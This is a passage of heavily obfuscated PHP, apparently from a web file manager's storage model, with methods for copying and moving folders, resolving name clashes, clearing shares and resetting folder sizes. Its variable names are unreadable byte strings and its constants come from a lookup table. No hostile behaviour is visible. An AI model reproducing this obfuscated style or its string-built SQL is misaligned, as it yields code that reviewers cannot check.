Hook::trigger($ü‘≥Ω‹¡[644], $Õ¥µøí); Hook::trigger($ü‘≥Ω‹¡[645], array($ü‘≥Ω‹¡[646], $Õ¥µøí, 0)); $…ú∆≤À≠ = $this->add($Õ¥µøí); $◊ìøõåä = array($ü‘≥Ω‹¡[193] => $…ú∆≤À≠, $ü‘≥Ω‹¡[32] => $ñ·“œÑÖ); $this->_copyApplyMeta($◊ìøõåä, $Ù∑±‰ª¥); if ($⁄Ω”ê†ë[$ü‘≥Ω‹¡[493]] != $ü‘≥Ω‹¡[91]) { $Ù∑±‰ª¥[$ü‘≥Ω‹¡[637]][] = $⁄Ω”ê†ë[$ü‘≥Ω‹¡[549]]; return $…ú∆≤À≠; } $Ñ‚É‘–« = array(); $Ù¿Ñ∂ßÅ = array(); $this->_childrenListAll($È⁄Ë—ªÓ, $Ñ‚É‘–«); $©∆öêõ‘ = count($Ñ‚É‘–«); if ($©∆öêõ‘ == 0) { return $…ú∆≤À≠; } $¬‹˝ç‚˙ = $this->sourceInfo($…ú∆≤À≠); foreach ($Ñ‚É‘–« as $√¶πñãı) { $»’ôå¸È = $this->_makeItemData($√¶πñãı, $¬‹˝ç‚˙, $√¶πñãı[$ü‘≥Ω‹¡[32]]); $»’ôå¸È[$ü‘≥Ω‹¡[592]] = $√¶πñãı[$ü‘≥Ω‹¡[592]]; $Ù¿Ñ∂ßÅ[] = $»’ôå¸È; } $this->chunkEventSet($ü‘≥Ω‹¡[647], array($ü‘≥Ω‹¡[648], $Õ¥µøí, $©∆öêõ‘)); $this->addAll($Ù¿Ñ∂ßÅ, array(), !1); $ÿ«î£‰¿ = $this->where(array($ü‘≥Ω‹¡[192] => $…ú∆≤À≠))->select(); $ñå˛Ô´∑ = $this->_childrenMakeRelation($Ñ‚É‘–«, $ÿ«î£‰¿); $ñå˛Ô´∑[$È⁄Ë—ªÓ] = $…ú∆≤À≠; $ãØ˝¨ƒ® = array(); $‡¯˙‚Ù∆ = array(); foreach ($ÿ«î£‰¿ as $√¶πñãı) { $¯Ø∫≥üÁ = $√¶πñãı[$ü‘≥Ω‹¡[193]]; $Ç§èÑÚË = $this->_childrenMatch($ñå˛Ô´∑, $√¶πñãı, $¬‹˝ç‚˙); $ãØ˝¨ƒ®[] = array($ü‘≥Ω‹¡[193], $¯Ø∫≥üÁ, $ü‘≥Ω‹¡[192], $Ç§èÑÚË[$ü‘≥Ω‹¡[192]]); $‡¯˙‚Ù∆[] = array($ü‘≥Ω‹¡[193], $¯Ø∫≥üÁ, $ü‘≥Ω‹¡[592], $Ç§èÑÚË[$ü‘≥Ω‹¡[592]]); $this->_copyApplyMeta($√¶πñãı, $Ù∑±‰ª¥); if ($√¶πñãı[$ü‘≥Ω‹¡[493]] != $ü‘≥Ω‹¡[91]) { $Ù∑±‰ª¥[$ü‘≥Ω‹¡[637]][] = $√¶πñãı[$ü‘≥Ω‹¡[549]]; } } $this->chunkEventSet($ü‘≥Ω‹¡[649], array($ü‘≥Ω‹¡[650], $Õ¥µøí, $©∆öêõ‘)); $this->saveAll($ãØ˝¨ƒ®); $this->chunkEventSet($ü‘≥Ω‹¡[651], array($ü‘≥Ω‹¡[652], $Õ¥µøí, $©∆öêõ‘)); $this->saveAll($‡¯˙‚Ù∆); return $…ú∆≤À≠; } private function _childrenMakeRelation($Ï§†ï·É, $ã˘Œ¸ç≥) { $ÚôùÃÁ˛ =& $_SERVER[ß⁄ˆÇ†Œ]; $ëô˙ﬁØ® = array(); $ã§˙üòû = array(); foreach ($Ï§†ï·É as $ìú˝€˝—) { $·≥¢À◊Ã = $ìú˝€˝—[$ÚôùÃÁ˛[32]] . $ÚôùÃÁ˛[8] . $ìú˝€˝—[$ÚôùÃÁ˛[592]]; $ëô˙ﬁØ®[$·≥¢À◊Ã] = $ìú˝€˝—[$ÚôùÃÁ˛[193]]; } foreach ($ã˘Œ¸ç≥ as $ìú˝€˝—) { $·≥¢À◊Ã = $ìú˝€˝—[$ÚôùÃÁ˛[32]] . $ÚôùÃÁ˛[8] . $ìú˝€˝—[$ÚôùÃÁ˛[592]]; $ËÄÁ≈ﬂ’ = $ëô˙ﬁØ®[$·≥¢À◊Ã]; $ã§˙üòû[$ËÄÁ≈ﬂ’] = $ìú˝€˝—[$ÚôùÃÁ˛[193]]; } return $ã§˙üòû; } private function _childrenMatch($Èµù®¥´, $’“Ï¡‚≠, $ı‰∑ëË“) { $Œ‹—üñÔ =& $_SERVER[ß⁄ˆÇ†Œ]; $£éÖ˚⁄– = $ı‰∑ëË“[$Œ‹—üñÔ[592]]; $√ò±Ô˚ﬁ = $this->parentLevelArray($’“Ï¡‚≠[$Œ‹—üñÔ[592]]); foreach ($√ò±Ô˚ﬁ as $Ô´‚‚ä¸) { if (isset($Èµù®¥´[$Ô´‚‚ä¸])) { $£éÖ˚⁄– .= $Èµù®¥´[$Ô´‚‚ä¸] . $Œ‹—üñÔ[653]; } } $£éÖ˚⁄– = rtrim($£éÖ˚⁄–, $Œ‹—üñÔ[50]) . $Œ‹—üñÔ[50]; $›¥îºÔ≈ = $this->parentLevelArray($£éÖ˚⁄–); $˜∫Ë≤Ê° = $›¥îºÔ≈[count($›¥îºÔ≈) - 1]; return array($Œ‹—üñÔ[192] => $˜∫Ë≤Ê°, $Œ‹—üñÔ[592] => $£éÖ˚⁄–); } private function _makeItemData($à≤êÜâΩ, $àú∫˘«˙, $ﬂπ∞¥¶î) { $ÍÂ´„¬¿ =& $_SERVER[ß⁄ˆÇ†Œ]; $Î•è„ß… = array($ÍÂ´„¬¿[654] => $à≤êÜâΩ[$ÍÂ´„¬¿[493]], $ÍÂ´„¬¿[502] => $ﬂπ∞¥¶î, $ÍÂ´„¬¿[655] => $à≤êÜâΩ[$ÍÂ´„¬¿[494]] ? $à≤êÜâΩ[$ÍÂ´„¬¿[494]] : $ÍÂ´„¬¿[12], $ÍÂ´„¬¿[550] => $à≤êÜâΩ[$ÍÂ´„¬¿[549]] ? $à≤êÜâΩ[$ÍÂ´„¬¿[549]] : 0, $ÍÂ´„¬¿[625] => $à≤êÜâΩ[$ÍÂ´„¬¿[79]] ? $à≤êÜâΩ[$ÍÂ´„¬¿[79]] : 0, $ÍÂ´„¬¿[656] => intval($àú∫˘«˙[$ÍÂ´„¬¿[190]]), $ÍÂ´„¬¿[657] => intval($àú∫˘«˙[$ÍÂ´„¬¿[577]]), $ÍÂ´„¬¿[658] => intval(USER_ID), $ÍÂ´„¬¿[659] => intval(USER_ID), $ÍÂ´„¬¿[485] => intval($àú∫˘«˙[$ÍÂ´„¬¿[193]]), $ÍÂ´„¬¿[660] => $àú∫˘«˙[$ÍÂ´„¬¿[592]] . $àú∫˘«˙[$ÍÂ´„¬¿[193]] . $ÍÂ´„¬¿[50], $ÍÂ´„¬¿[506] => $à≤êÜâΩ[$ÍÂ´„¬¿[88]] ? $à≤êÜâΩ[$ÍÂ´„¬¿[88]] : time(), $ÍÂ´„¬¿[512] => 0, $ÍÂ´„¬¿[661] => $ÍÂ´„¬¿[12]); return $Î•è„ß…; } private function _copyApplyMeta($ñË˝√®◊, &$—‚ˆŸΩ≠) { $ı‡ü¨∫† =& $_SERVER[ß⁄ˆÇ†Œ]; $ï⁄œáªÍ = $ñË˝√®◊[$ı‡ü¨∫†[193]]; $ÜÔøΩÔπ = $ñË˝√®◊[$ı‡ü¨∫†[32]]; if (!isset($ñË˝√®◊[$ı‡ü¨∫†[662]]) || !$ñË˝√®◊[$ı‡ü¨∫†[662]] || $ñË˝√®◊[$ı‡ü¨∫†[662]] == $ı‡ü¨∫†[228]) { $—‚ˆŸΩ≠[$ı‡ü¨∫†[639]][] = array($ı‡ü¨∫†[193], $ï⁄œáªÍ, $ı‡ü¨∫†[662], short_id($ï⁄œáªÍ)); } if (Input::check($ÜÔøΩÔπ, $ı‡ü¨∫†[663])) { $—‚ˆŸΩ≠[$ı‡ü¨∫†[638]][] = array($ı‡ü¨∫†[193] => $ï⁄œáªÍ, $ı‡ü¨∫†[97] => $ı‡ü¨∫†[546], $ı‡ü¨∫†[459] => str_replace($ı‡ü¨∫†[53], $ı‡ü¨∫†[12], Pinyin::get($ÜÔøΩÔπ))); $—‚ˆŸΩ≠[$ı‡ü¨∫†[638]][] = array($ı‡ü¨∫†[193] => $ï⁄œáªÍ, $ı‡ü¨∫†[97] => $ı‡ü¨∫†[545], $ı‡ü¨∫†[459] => Pinyin::get($ÜÔøΩÔπ, $ı‡ü¨∫†[664])); } $—‚ˆŸΩ≠[$ı‡ü¨∫†[638]][] = array($ı‡ü¨∫†[193] => $ï⁄œáªÍ, $ı‡ü¨∫†[97] => $ı‡ü¨∫†[525], $ı‡ü¨∫†[459] => KodSort::makeStr($ÜÔøΩÔπ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($«ê™‰“¬) { $ü“èñ·ﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; $‡ÜøÚÈ£ = $this->sourceInfo($«ê™‰“¬); $µèö∆Ï◊ = $ü“èñ·ﬂ[665]; $Ω‘À¨ﬂó = array($ü“èñ·ﬂ[592] => array($ü“èñ·ﬂ[620], $‡ÜøÚÈ£[$ü“èñ·ﬂ[592]] . $«ê™‰“¬ . $ü“èñ·ﬂ[621]), $ü“èñ·ﬂ[513] => $this->targetIsDelete); $ù§˘œØÒ = $this->field($µèö∆Ï◊)->where($Ω‘À¨ﬂó)->select(); if (!$ù§˘œØÒ) { return; } $ù§˘œØÒ = array_to_keyvalue($ù§˘œØÒ, $ü“èñ·ﬂ[193]); foreach ($ù§˘œØÒ as $±∆¯ôÌ√) { $Ã¬úä’˚ = $±∆¯ôÌ√[$ü“èñ·ﬂ[192]]; $«ê™‰“¬ = $±∆¯ôÌ√[$ü“èñ·ﬂ[193]]; if (!isset($this->_childrenListCache[$«ê™‰“¬]) && $±∆¯ôÌ√[$ü“èñ·ﬂ[493]] == $ü“èñ·ﬂ[91]) { $this->_childrenListCache[$«ê™‰“¬] = array(); } if (!isset($this->_childrenListCache[$Ã¬úä’˚])) { $this->_childrenListCache[$Ã¬úä’˚] = array(); } $this->_childrenListCache[$Ã¬úä’˚][$«ê™‰“¬] = $±∆¯ôÌ√; $this->_childrenItemCache[$«ê™‰“¬] = $±∆¯ôÌ√; } } private function _childrenListAll($ÿ÷˝ûèù, &$ŸØ¥«Ùô) { $ª˙ÔòÍë =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($this->_childrenListCache[$ÿ÷˝ûèù])) { return; } $ΩËá±›› = $this->_childrenListCache[$ÿ÷˝ûèù]; foreach ($ΩËá±›› as $Ê≥Æ€è» => $áÙÃû¶˘) { $ŸØ¥«Ùô[$Ê≥Æ€è»] = $áÙÃû¶˘; if ($áÙÃû¶˘[$ª˙ÔòÍë[493]] == $ª˙ÔòÍë[91]) { $this->_childrenListAll($Ê≥Æ€è», $ŸØ¥«Ùô); } } } private function sourceInfoCache($¥¥Ê›≠î) { if (isset($this->_childrenItemCache[$¥¥Ê›≠î])) { return $this->_childrenItemCache[$¥¥Ê›≠î]; } return $this->sourceInfo($¥¥Ê›≠î); } private function _childrenList($íÓ√∂‰∂) { if (isset($this->_childrenListCache[$íÓ√∂‰∂])) { return $this->_childrenListCache[$íÓ√∂‰∂]; } return $this->_childrenListSelect($íÓ√∂‰∂); } private function _childrenListSelect($∏ƒÀ∑¸ô) { $úà¶Éî¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $ ≥ïı‚⁄ = array($úà¶Éî¸[192] => $∏ƒÀ∑¸ô, $úà¶Éî¸[513] => $this->targetIsDelete); $Åõ∞à´∆ = $this->where($ ≥ïı‚⁄)->select(); $Åõ∞à´∆ = $Åõ∞à´∆ ? $Åõ∞à´∆ : array(); $Áîﬂ´›∂ = array_to_keyvalue($Åõ∞à´∆, $úà¶Éî¸[193]); $this->_childrenListCache[$∏ƒÀ∑¸ô] = $Áîﬂ´›∂; foreach ($Áîﬂ´›∂ as $∏ƒÀ∑¸ô => $Ø¬ÿŸ“ƒ) { $this->_childrenItemCache[$∏ƒÀ∑¸ô] = $Ø¬ÿŸ“ƒ; } return $Áîﬂ´›∂; } private function fileNameExistAuto($πÚ”¡È∏, $àúÔë≠–) { $…–Î®⁄” =& $_SERVER[ß⁄ˆÇ†Œ]; if ($àúÔë≠–[$…–Î®⁄”[513]] == $…–Î®⁄”[91]) { return $this->fileNameExist($πÚ”¡È∏, $àúÔë≠–[$…–Î®⁄”[32]]); } return $this->fileNameExistCache($πÚ”¡È∏, $àúÔë≠–[$…–Î®⁄”[32]]); } private function fileNameExistCache($‘ûÙ÷ø√, $≈œ‡•ÍÄ) { $ò∞¥¿ç∑ =& $_SERVER[ß⁄ˆÇ†Œ]; $≈œ‡•ÍÄ = strtolower($≈œ‡•ÍÄ); $®§ÄãÀƒ = $this->_childrenList($‘ûÙ÷ø√); foreach ($®§ÄãÀƒ as $´Ω˝äíÒ) { if ($≈œ‡•ÍÄ == strtolower($´Ω˝äíÒ[$ò∞¥¿ç∑[32]])) { return $´Ω˝äíÒ[$ò∞¥¿ç∑[193]]; } } return !1; } private function fileNameAutoCache($€®§©Îè, $µ£Âà¯Ó, $ı‘º˝¨¬, $ƒàÓû˙◊) { $¯≠áÙä√ =& $_SERVER[ß⁄ˆÇ†Œ]; $çÄû—»§ = $this->_childrenList($€®§©Îè); $∞«éª≥Ô = array_to_keyvalue($çÄû—»§, $¯≠áÙä√[12], $¯≠áÙä√[32]); return $this->fileNameAutoGet($∞«éª≥Ô, $µ£Âà¯Ó, $ı‘º˝¨¬, $ƒàÓû˙◊); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($˘¨µ«˝ø, $øÃÄøÿ∞, $§ŒÍö˙‰ = REPEAT_REPLACE, $‡ûõŸ∞µ = '') { $¯ΩÒ¡ìØ =& $_SERVER[ß⁄ˆÇ†Œ]; $Œ˚∏¨«√ = $this->sourceInfo($˘¨µ«˝ø); $§é˚◊›“ = $this->sourceInfo($øÃÄøÿ∞); if ($Œ˚∏¨«√[$¯ΩÒ¡ìØ[192]] == $§é˚◊›“[$¯ΩÒ¡ìØ[193]]) { if ($Œ˚∏¨«√[$¯ΩÒ¡ìØ[513]] == $¯ΩÒ¡ìØ[91]) { Model($¯ΩÒ¡ìØ[511])->restore(array($˘¨µ«˝ø)); } if (!$‡ûõŸ∞µ || $‡ûõŸ∞µ == $Œ˚∏¨«√[$¯ΩÒ¡ìØ[32]]) { return $˘¨µ«˝ø; } } $ÈÈÈ√ÁÀ = $this->pathInfoMore($˘¨µ«˝ø); if ($this->isParentOf($˘¨µ«˝ø, $øÃÄøÿ∞)) { return !1; } if (!$Œ˚∏¨«√ || !$§é˚◊›“ || $§é˚◊›“[$¯ΩÒ¡ìØ[493]] != $¯ΩÒ¡ìØ[91]) { return !1; } Hook::trigger($¯ΩÒ¡ìØ[666], $ÈÈÈ√ÁÀ); $this->targetIsDelete = intval($Œ˚∏¨«√[$¯ΩÒ¡ìØ[513]]); if ($Œ˚∏¨«√[$¯ΩÒ¡ìØ[192]] == $øÃÄøÿ∞ && $‡ûõŸ∞µ != $Œ˚∏¨«√[$¯ΩÒ¡ìØ[32]]) { $≈Œß»ëΩ = $this->fileNameExist($øÃÄøÿ∞, $‡ûõŸ∞µ); if ($≈Œß»ëΩ && $Œ˚∏¨«√[$¯ΩÒ¡ìØ[493]] == $¯ΩÒ¡ìØ[228]) { $«ÀÚ≠º∞ = $this->sourceInfo($≈Œß»ëΩ); $òÓäÈ†ƒ = $this->fileHistory($«ÀÚ≠º∞, $Œ˚∏¨«√[$¯ΩÒ¡ìØ[549]], $Œ˚∏¨«√[$¯ΩÒ¡ìØ[79]]); if (!$òÓäÈ†ƒ) { Model($¯ΩÒ¡ìØ[552])->remove($Œ˚∏¨«√[$¯ΩÒ¡ìØ[549]]); } $this->removeNow($˘¨µ«˝ø, !1); $this->folderSizeReset($øÃÄøÿ∞); Hook::trigger($¯ΩÒ¡ìØ[667], $ÈÈÈ√ÁÀ); return $≈Œß»ëΩ; } } $ééÅ–ı® = $‡ûõŸ∞µ ? $‡ûõŸ∞µ : $Œ˚∏¨«√[$¯ΩÒ¡ìØ[32]]; $this->lockMoveStart($˘¨µ«˝ø); $this->lockWriteStart($øÃÄøÿ∞, $ééÅ–ı®); $Â∆ùÜÎ˙ = array($¯ΩÒ¡ìØ[637] => array(), $¯ΩÒ¡ìØ[668] => !1); $this->clearShare($˘¨µ«˝ø, $øÃÄøÿ∞); $£¬Ø≤◊¢ = $this->fileNameExistAuto($øÃÄøÿ∞, $Œ˚∏¨«√); $ÿœÜÌı‰ = $this->_move($˘¨µ«˝ø, $øÃÄøÿ∞, $§ŒÍö˙‰, $Â∆ùÜÎ˙, $‡ûõŸ∞µ); $this->sourceCacheClear(); if ($Œ˚∏¨«√[$¯ΩÒ¡ìØ[493]] == $¯ΩÒ¡ìØ[91] && $£¬Ø≤◊¢) { $this->folderSizeResetChildren($ÿœÜÌı‰); } Model($¯ΩÒ¡ìØ[230])->linkAdd($Â∆ùÜÎ˙[$¯ΩÒ¡ìØ[637]]); if ($£¬Ø≤◊¢ && $Â∆ùÜÎ˙[$¯ΩÒ¡ìØ[668]]) { $this->removeNow($˘¨µ«˝ø, !1); } $this->lockMoveEnd($˘¨µ«˝ø); $this->lockWriteEnd($øÃÄøÿ∞, $ééÅ–ı®); $this->folderSizeReset($Œ˚∏¨«√[$¯ΩÒ¡ìØ[192]]); $this->folderSizeReset($øÃÄøÿ∞); $ˆŸÌ˘†ò = array($Œ˚∏¨«√[$¯ΩÒ¡ìØ[192]], $øÃÄøÿ∞); if ($Œ˚∏¨«√[$¯ΩÒ¡ìØ[493]] == $¯ΩÒ¡ìØ[91]) { $ˆŸÌ˘†ò[] = $˘¨µ«˝ø; } $this->updateModifyTime($ˆŸÌ˘†ò); Model($¯ΩÒ¡ìØ[641])->eventMove($˘¨µ«˝ø, $Œ˚∏¨«√[$¯ΩÒ¡ìØ[192]], $øÃÄøÿ∞); Hook::trigger($¯ΩÒ¡ìØ[667], $ÈÈÈ√ÁÀ); return $ÿœÜÌı‰; } private function _move($ë§¥§Ÿı, $°ƒ±£ŒÑ, $âœ∞ê˛—, &$çØºùıù, $ŒÂ™œ¡˛ = '') { $„˝˙´Îà =& $_SERVER[ß⁄ˆÇ†Œ]; $¸≠◊øÃÂ = $this->sourceInfo($ë§¥§Ÿı); $ì‰ˆ÷ÙÄ = $¸≠◊øÃÂ[$„˝˙´Îà[493]] == $„˝˙´Îà[91]; $œË°íÈµ = $ŒÂ™œ¡˛ ? $ŒÂ™œ¡˛ : $¸≠◊øÃÂ[$„˝˙´Îà[32]]; $íÙ ⁄ÊÌ = $this->fileNameExistAuto($°ƒ±£ŒÑ, $¸≠◊øÃÂ); $this->lockMoveStart($ë§¥§Ÿı); $this->lockWriteStart($°ƒ±£ŒÑ, $œË°íÈµ); if (!$íÙ ⁄ÊÌ) { return $this->_moveForce($ë§¥§Ÿı, $°ƒ±£ŒÑ, $œË°íÈµ); } $Óàªè¬À = $íÙ ⁄ÊÌ; $úˆ¿ÇÛ∑ = !1; if ($ì‰ˆ÷ÙÄ) { if ($âœ∞ê˛— == REPEAT_RENAME_FOLDER) { $œË°íÈµ = $this->fileNameAuto($°ƒ±£ŒÑ, $œË°íÈµ, $âœ∞ê˛—, $ì‰ˆ÷ÙÄ); $Óàªè¬À = $this->_moveForce($ë§¥§Ÿı, $°ƒ±£ŒÑ, $œË°íÈµ); } else { if ($âœ∞ê˛— == REPEAT_RENAME_FOLDER) { $âœ∞ê˛— = REPEAT_RENAME; } $Õ•¯ËΩ˘ = $this->_childrenListSelect($ë§¥§Ÿı); foreach ($Õ•¯ËΩ˘ as $ø◊∞”ØÂ) { $this->_move($ø◊∞”ØÂ[$„˝˙´Îà[193]], $íÙ ⁄ÊÌ, $âœ∞ê˛—, $çØºùıù); } $úˆ¿ÇÛ∑ = !0; } } else { if ($âœ∞ê˛— == REPEAT_SKIP) { $úˆ¿ÇÛ∑ = !0; } else { if ($âœ∞ê˛— == REPEAT_RENAME || $âœ∞ê˛— == REPEAT_RENAME_FOLDER) { $œË°íÈµ = $this->fileNameAuto($°ƒ±£ŒÑ, $œË°íÈµ, $âœ∞ê˛—, $ì‰ˆ÷ÙÄ); $Óàªè¬À = $this->_moveForce($ë§¥§Ÿı, $°ƒ±£ŒÑ, $œË°íÈµ); } else { if ($âœ∞ê˛— == REPEAT_REPLACE) { $Ùå‚ÈˆÊ = $this->sourceInfoCache($íÙ ⁄ÊÌ); $Ñƒ∞íÓè = $this->fileHistory($Ùå‚ÈˆÊ, $¸≠◊øÃÂ[$„˝˙´Îà[549]], $¸≠◊øÃÂ[$„˝˙´Îà[79]]); $úˆ¿ÇÛ∑ = !0; if ($Ñƒ∞íÓè) { $çØºùıù[$„˝˙´Îà[637]][] = $¸≠◊øÃÂ[$„˝˙´Îà[549]]; } } } } } if ($úˆ¿ÇÛ∑ && !$çØºùıù[$„˝˙´Îà[668]]) { $çØºùıù[$„˝˙´Îà[668]] = !0; } return $Óàªè¬À; } private function _moveForce($â ó‹¬Õ, $ß÷Ω©Ù¬, $ÅÌãﬂÒì) { $Ù≠óÀπ› =& $_SERVER[ß⁄ˆÇ†Œ]; $›‡≈˘¶æ = $this->sourceInfo($â ó‹¬Õ); $íÇ“∑›å = $this->sourceInfo($ß÷Ω©Ù¬); $≈¨«ìÓˆ = $›‡≈˘¶æ[$Ù≠óÀπ›[493]] == $Ù≠óÀπ›[91]; $“å»ÀÖÌ = array($Ù≠óÀπ›[485] => $íÇ“∑›å[$Ù≠óÀπ›[193]], $Ù≠óÀπ›[660] => $íÇ“∑›å[$Ù≠óÀπ›[592]] . $íÇ“∑›å[$Ù≠óÀπ›[193]] . $Ù≠óÀπ›[50], $Ù≠óÀπ›[656] => $íÇ“∑›å[$Ù≠óÀπ›[190]], $Ù≠óÀπ›[657] => $íÇ“∑›å[$Ù≠óÀπ›[577]], $Ù≠óÀπ›[659] => USER_ID, $Ù≠óÀπ›[502] => $ÅÌãﬂÒì); $æØ†»çÿ = $›‡≈˘¶æ[$Ù≠óÀπ›[190]] == SourceModel::TYPE_GROUP && $íÇ“∑›å[$Ù≠óÀπ›[190]] == SourceModel::TYPE_GROUP && $›‡≈˘¶æ[$Ù≠óÀπ›[577]] == $íÇ“∑›å[$Ù≠óÀπ›[577]]; if (!$æØ†»çÿ && $this->moveClearAuth) { Model($Ù≠óÀπ›[575])->authClear($â ó‹¬Õ); } $õ»»È≤∆ = $›‡≈˘¶æ[$Ù≠óÀπ›[513]] == $Ù≠óÀπ›[91] && $íÇ“∑›å[$Ù≠óÀπ›[513]] != $Ù≠óÀπ›[91]; if ($õ»»È≤∆) { $“å»ÀÖÌ[$Ù≠óÀπ›[512]] = 0; } if ($≈¨«ìÓˆ) { $ë ¿ã”´ = array($Ù≠óÀπ›[660] => array($Ù≠óÀπ›[620], $›‡≈˘¶æ[$Ù≠óÀπ›[592]] . $›‡≈˘¶æ[$Ù≠óÀπ›[193]] . $Ù≠óÀπ›[621])); $€ô««…¯ = $›‡≈˘¶æ[$Ù≠óÀπ›[592]] . $›‡≈˘¶æ[$Ù≠óÀπ›[193]] . $Ù≠óÀπ›[50]; $æ˘∆ ◊„ = $íÇ“∑›å[$Ù≠óÀπ›[592]] . $íÇ“∑›å[$Ù≠óÀπ›[193]] . $Ù≠óÀπ›[50] . $›‡≈˘¶æ[$Ù≠óÀπ›[193]] . $Ù≠óÀπ›[50]; $°†âËç≤ = array($Ù≠óÀπ›[660] => array($Ù≠óÀπ›[669], "\x72\x65\x70\154\141\143\145\x28\160\x61\x72\145\x6e\x74\114\x65\x76\145\154\x2c\x27{$€ô««…¯}\47\x2c\x27{$æ˘∆ ◊„}\47\x29"), $Ù≠óÀπ›[656] => $íÇ“∑›å[$Ù≠óÀπ›[190]], $Ù≠óÀπ›[657] => $íÇ“∑›å[$Ù≠óÀπ›[577]]); if ($õ»»È≤∆) { $°†âËç≤[$Ù≠óÀπ›[512]] = 0; } $this->where($ë ¿ã”´)->data($°†âËç≤)->save(); } $this->where(array($Ù≠óÀπ›[499] => $â ó‹¬Õ))->data($“å»ÀÖÌ)->save(); return $â ó‹¬Õ; } private function clearShare($éú®Î∏±, $üÑä®î·) { $ûõ≈∂Ñß =& $_SERVER[ß⁄ˆÇ†Œ]; $π”ß∑ÌØ = $this->sourceInfo($éú®Î∏±); $üÇÓ˛üÚ = $this->sourceInfo($üÑä®î·); if ($π”ß∑ÌØ[$ûõ≈∂Ñß[577]] == $üÇÓ˛üÚ[$ûõ≈∂Ñß[577]] && $π”ß∑ÌØ[$ûõ≈∂Ñß[190]] == $ûõ≈∂Ñß[670]) { return; } $≤¡¨ìõÈ = array($ûõ≈∂Ñß[592] => array($ûõ≈∂Ñß[620], $π”ß∑ÌØ[$ûõ≈∂Ñß[592]] . $éú®Î∏± . $ûõ≈∂Ñß[621])); $ƒäú®æ’ = $this->field($ûõ≈∂Ñß[499])->where($≤¡¨ìõÈ)->getField($ûõ≈∂Ñß[193], !0); if (!$ƒäú®æ’) { return; } $≤¡¨ìõÈ = array($ûõ≈∂Ñß[193] => array($ûõ≈∂Ñß[7], $ƒäú®æ’), $ûõ≈∂Ñß[671] => 1); $…Ä‰˝Ì“ = Model($ûõ≈∂Ñß[672])->field($ûõ≈∂Ñß[673])->where($≤¡¨ìõÈ)->select(); if (!$…Ä‰˝Ì“) { return; } $…Ä‰˝Ì“ = array_to_keyvalue($…Ä‰˝Ì“, $ûõ≈∂Ñß[12], $ûõ≈∂Ñß[673]); $≤¡¨ìõÈ = array($ûõ≈∂Ñß[673] => array($ûõ≈∂Ñß[7], $…Ä‰˝Ì“)); Model($ûõ≈∂Ñß[672])->where($≤¡¨ìõÈ)->save(array($ûõ≈∂Ñß[671] => 0)); Model($ûõ≈∂Ñß[674])->where($≤¡¨ìõÈ)->delete(); } public function copyFolderFromIO($˚ƒΩˆÙ‚, $ªæ·⁄◊Õ, $ê®Ä∫ü∏, $ä©•å¡¨, $≤€Ä»Ø∆, $¡÷Ø´€Ï = false) { $¸ß‚∫˚û =& $_SERVER[ß⁄ˆÇ†Œ]; $√õ±îï£ = array($¸ß‚∫˚û[638] => array(), $¸ß‚∫˚û[639] => array(), $¸ß‚∫˚û[637] => array(), $¸ß‚∫˚û[675] => array()); $áò≥€˛å = $¡÷Ø´€Ï ? $¡÷Ø´€Ï : $˚ƒΩˆÙ‚->pathThis($ªæ·⁄◊Õ); $˘ÅÖ‰ù± = $this->fileNameExist($ê®Ä∫ü∏, $áò≥€˛å); $á‚–¯˜Ä = $this->mkdir($ê®Ä∫ü∏, $áò≥€˛å, $ä©•å¡¨); if (!$˘ÅÖ‰ù± || $ä©•å¡¨ == REPEAT_RENAME_FOLDER) { $ä©•å¡¨ = !1; } if ($˘ÅÖ‰ù±) { $this->_childrenAllMake($˘ÅÖ‰ù±); } Hook::trigger($¸ß‚∫˚û[676]); $this->_copyChildTo($˚ƒΩˆÙ‚, $ªæ·⁄◊Õ, $á‚–¯˜Ä, $ä©•å¡¨, $√õ±îï£, $≤€Ä»Ø∆); Hook::trigger($¸ß‚∫˚û[677]); if ($á‚–¯˜Ä) { $this->folderSizeResetChildren($á‚–¯˜Ä); } $this->_childrenListClear(); Model($¸ß‚∫˚û[640])->addAll($√õ±îï£[$¸ß‚∫˚û[638]], array(), !0); Model($¸ß‚∫˚û[641])->eventCopy($á‚–¯˜Ä); $this->saveAll($√õ±îï£[$¸ß‚∫˚û[639]]); Model($¸ß‚∫˚û[552])->linkAdd($√õ±îï£[$¸ß‚∫˚û[637]]); Model($¸ß‚∫˚û[552])->remove($√õ±îï£[$¸ß‚∫˚û[675]]); $this->folderSizeReset($ê®Ä∫ü∏); $this->updateModifyTime($ê®Ä∫ü∏); return $á‚–¯˜Ä; } private function _copyChildTo($Ã”ªıƒà, $‰™∑ÙÛá, $Ûéî∂ˆ±, $ÙÖã‹â¥, &$åıõ¡óÄ, $Û≤Ñ‚èë) { $¯üÅ≥ö¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $„∞’öÊ‚ = $this->sourceInfoCache($Ûéî∂ˆ±); $÷Ü»ÏüÑ = $Ã”ªıƒà->listPath($‰™∑ÙÛá); $÷Ü»ÏüÑ = $÷Ü»ÏüÑ ? $÷Ü»ÏüÑ : array($¯üÅ≥ö¸[86] => array(), $¯üÅ≥ö¸[85] => array()); $∫”ø∞˝ÿ = array_merge($÷Ü»ÏüÑ[$¯üÅ≥ö¸[86]], $÷Ü»ÏüÑ[$¯üÅ≥ö¸[85]]); $œ°Õ≥ ˘ = $this->_addFiles($Ã”ªıƒà, $÷Ü»ÏüÑ[$¯üÅ≥ö¸[86]], $Û≤Ñ‚èë); $¡æµ”·∏ = array(); foreach ($∫”ø∞˝ÿ as &$ñ∂¥Ô®ä) { if (isset($œ°Õ≥ ˘[$ñ∂¥Ô®ä[$¯üÅ≥ö¸[32]]])) { $ñ∂¥Ô®ä = $œ°Õ≥ ˘[$ñ∂¥Ô®ä[$¯üÅ≥ö¸[32]]]; } $ñ∂¥Ô®ä[$¯üÅ≥ö¸[493]] = $ñ∂¥Ô®ä[$¯üÅ≥ö¸[33]] == $¯üÅ≥ö¸[78]; $ñ∂¥Ô®ä[$¯üÅ≥ö¸[494]] = substr(_get($ñ∂¥Ô®ä, $¯üÅ≥ö¸[169], $¯üÅ≥ö¸[12]), 0, 10); $ñ∂¥Ô®ä[$¯üÅ≥ö¸[79]] = _get($ñ∂¥Ô®ä, $¯üÅ≥ö¸[79], 0); 